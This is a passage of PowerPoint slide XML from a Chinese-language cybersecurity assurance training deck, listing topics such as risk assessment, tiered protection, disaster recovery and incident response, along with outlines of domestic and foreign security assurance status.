              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="6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61"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6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6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59" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="686"/>
              <a:ext cx="1091" cy="202"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>网络空间安全应急处理与信息通报</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="52" name="AutoShape 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2987824" y="4808829"/>
            <a:ext cx="1710531"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网络空间安全保障</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>工作方法</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="19" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5352493" y="4268769"/>
            <a:ext cx="2963924" cy="357051"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="20" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="71"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72"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73"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74"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65" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="258"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>确定网络空间安全需求</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="AutoShape 57"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4888753" y="4412785"/>
            <a:ext cx="450453" cy="1429917"/>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sz="1600"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="23" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5366523" y="5168869"/>
            <a:ext cx="2949893" cy="393056"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="24" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="79"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80"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81"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82"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78" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="234"/>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网络空间安全测评</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="25" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5328085" y="2564904"/>
            <a:ext cx="2980394" cy="395746"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="26" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="89"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95"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96"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97"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83" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="233"/>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网络空间安全等级保护</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="27" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5330519" y="2996952"/>
            <a:ext cx="2970131" cy="364164"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="29" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="101"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02"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03"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04"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00" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="253"/>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网络空间安全风险评估</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="30" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5330519" y="3401953"/>
            <a:ext cx="2977959" cy="354140"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="31" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="108"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09"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10"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11"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07" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="211"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>灾难恢复</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="32" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5328085" y="3800717"/>
            <a:ext cx="2988332" cy="360040"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="33" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="115"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16"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17"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18"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14" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="211"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>人才队伍建设</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="34" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5350915" y="4700817"/>
            <a:ext cx="2965501" cy="387251"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="35" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="122"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23"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24"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25"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21" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="216"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1400" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="040404"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>设计并实施网络空间安全方案</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="36" name="Group 42"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5364089" y="5587109"/>
            <a:ext cx="2952328" cy="369395"/>
            <a:chOff x="535" y="663"/>
            <a:chExt cx="1142" cy="272"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="37" name="Group 43"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="535" y="663"/>
              <a:ext cx="1139" cy="272"/>
              <a:chOff x="2272" y="1479"/>
              <a:chExt cx="1363" cy="1800"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="15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51"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5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5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49" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="586" y="663"/>
              <a:ext cx="1091" cy="249"/>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网络空间安全监测与维护</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="040404"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="400262957"/>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02B57F5E-BB90-4246-BC79-F5793CDBCD60}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" sz="1000" smtClean="0">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:pPr eaLnBrk="1" hangingPunct="1"/>
              <a:t>73</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5123" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="668833" y="2916448"/>
            <a:ext cx="8245475" cy="3305200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识子域：我国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全保障现状</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>了解我国信息化与</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>安全形势</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>了解我国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>安全保障发展阶段</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>理解我国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>安全保障基本思路</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>了解我国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>安全保障目标</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>了解我国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>安全保障的整体规划</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>了解我国</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0"/>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>安全保障体系的框架</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5124" name="标题 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="827584" y="726855"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识域：网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全保障现状</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5125" name="灯片编号占位符 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="4191000" y="6505575"/>
            <a:ext cx="8382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algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:fld id="{EFAB4A9A-4C7B-4AD7-A2AD-E0439BD7DDD0}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" sz="1000">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
              <a:t>73</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1000">
              <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="551630" y="1364867"/>
            <a:ext cx="8479879" cy="1409617"/>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zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>知识子域：国外</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全保障情况</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>了解发达国家</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全状况和保障的主要举措</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="24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400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>了解发达国家网络空间安全方面主要动态</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" sz="2400" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1582300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3">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
